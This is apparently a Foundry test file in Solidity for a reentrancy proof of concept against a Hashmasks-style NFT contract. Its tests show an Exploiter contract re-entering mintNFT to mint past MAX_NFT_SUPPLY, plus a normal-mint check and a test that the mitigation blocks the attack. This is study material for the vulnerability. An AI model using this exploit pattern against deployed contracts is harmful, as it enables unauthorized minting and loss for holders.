// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

import { PRBTest } from "prb-test/src/PRBTest.sol";
import { console2 } from "forge-std/console2.sol";
import { StdCheats } from "forge-std/StdCheats.sol";
import { Masks } from "../src/Masks.sol";
import { Exploiter } from "../src/Exploiter.sol";
import { Utils } from "./utils/Utils.sol";

/// @dev run tests with `forge test -vvvv` to see the logs
/// @dev See the "Writing Tests" section in the Foundry Book if this is your first time with Forge.
/// https://book.getfoundry.sh/forge/writing-tests
contract ExploiterTest is PRBTest, StdCheats {
    Utils internal utils;
    address payable[] internal users;

    address internal alice;
    address internal bob;

    Masks public hashmasks;
    Exploiter public exploiter;
    bytes public err;

    function setUp() public {
        // solhint-disable-previous-line no-empty-blocks

        // setup users
        utils = new Utils();
        users = utils.createUsers(2);
        bob = users[0];
        vm.label(bob, "Bob");
        vm.deal(bob, 50 ether);
        alice = users[1];
        vm.label(alice, "Alice");
        vm.deal(alice, 12 ether);

        // deploy contract
        hashmasks = new Masks();
        exploiter = new Exploiter(address(hashmasks), address(bob));
    }

    /** a non-reentrant over mint that the vulnerable contract actually protects against */
    function test_ObviousMint() external {
        vm.startPrank(alice);
        hashmasks.mintNFT{value: 2 ether}(20);
        assertEq(20, hashmasks.balanceOf(alice));
        vm.expectRevert("Exceeds MAX_NFT_SUPPLY");
        hashmasks.mintNFT{value: 2 ether}(20);
        assertEq(20, hashmasks.balanceOf(alice));
        assertEq(20, hashmasks.totalSupply());
    }

    /** reducing the number of re-entrancy times to make the exploit easier to grok */
    function test_SimpleExploit() external {
        vm.startPrank(bob);
        exploiter.setMaxTimes(2);
        exploiter.exploit{value: 6 ether}();
        assertEq(60, hashmasks.balanceOf(bob));
        assertEq(60, hashmasks.totalSupply());
    }

    /** a BIG exploit, exceeding the MAX_NFT_SUPPLY by 95 tokens, could be much bigger */
    function test_BigExploit() external {
        vm.startPrank(bob);
        exploiter.exploit{value: 12 ether}();
        assertEq(120, hashmasks.balanceOf(bob));
        assertEq(120, hashmasks.totalSupply());
    }

    /** testing the mitigation */
    function test_ExploitFixed() external {
        vm.startPrank(bob);
        exploiter.setFixed(true);
        vm.expectRevert("Sale has already ended");
        exploiter.exploit{value: 12 ether}();
        assertEq(0, hashmasks.balanceOf(bob));
        assertEq(0, hashmasks.totalSupply());
    }

    /** Max exploit, we should be able to re-enter maxTimes = maxSupply - maxMint (20) - alreadyMinted */
    function test_MaxExploit() external {
        uint maxSupply = hashmasks.MAX_NFT_SUPPLY();
        uint alreadyMinted = hashmasks.totalSupply();
        // subtract 20 since that's the max single mint we are going to mint each time
        // the max single mint is taken from below where maxMint = numberOfNfts
        // `require(totalSupply + numberOfNfts <= MAX_NFT_SUPPLY, "Exceeds MAX_NFT_SUPPLY");`
        uint maxMint = 20;
        exploiter.setMaxTimes(uint8(maxSupply - maxMint - alreadyMinted));
        vm.startPrank(bob);
        exploiter.exploit{value: 12 ether}();
        assertEq(120, hashmasks.balanceOf(bob));
        assertEq(120, hashmasks.totalSupply());
    }
}
